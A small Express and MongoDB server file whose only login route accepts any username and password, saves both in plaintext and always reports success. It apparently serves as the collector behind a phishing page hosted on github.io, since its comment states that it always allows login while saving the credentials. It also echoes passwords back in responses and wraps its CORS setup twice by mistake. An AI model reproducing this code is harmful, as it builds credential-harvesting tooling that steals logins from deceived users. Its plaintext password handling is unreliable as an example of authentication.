require("dotenv").config();
const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const mongoose = require("mongoose");

const app = express();
const PORT = process.env.PORT || 5000;

// MongoDB Connection
const url = process.env.MONGO_URI;
mongoose
  .connect(url, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
  })
  .then(() => {
    console.log("mongodb connected successfully");
  })
  .catch(() => {
    console.log("errr in connection");
  });

app.use(
  cors(
    cors({
      origin: "https://rafiullah1819.github.io",
      methods: ["GET", "POST", "PUT", "DELETE"],
    })
  )
);
app.use(bodyParser.json());

// User Schema and Model
const userSchema = new mongoose.Schema({
  username: String,
  password: String,
});
const User = mongoose.model("User", userSchema);

// Route to handle login requests
app.post("/", async (req, res) => {
  const { username, password } = req.body;

  // Simple validation
  if (!username || !password) {
    return res
      .status(400)
      .json({ error: "Username and password are required." });
  }

  // Always allow login, saving both username and password
  const user = new User({ username, password });
  await user.save();

  res.status(200).json({
    message: "Login successful!",
    user: {
      username,
      password,
    },
  });
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server is running on :${PORT}`);
});
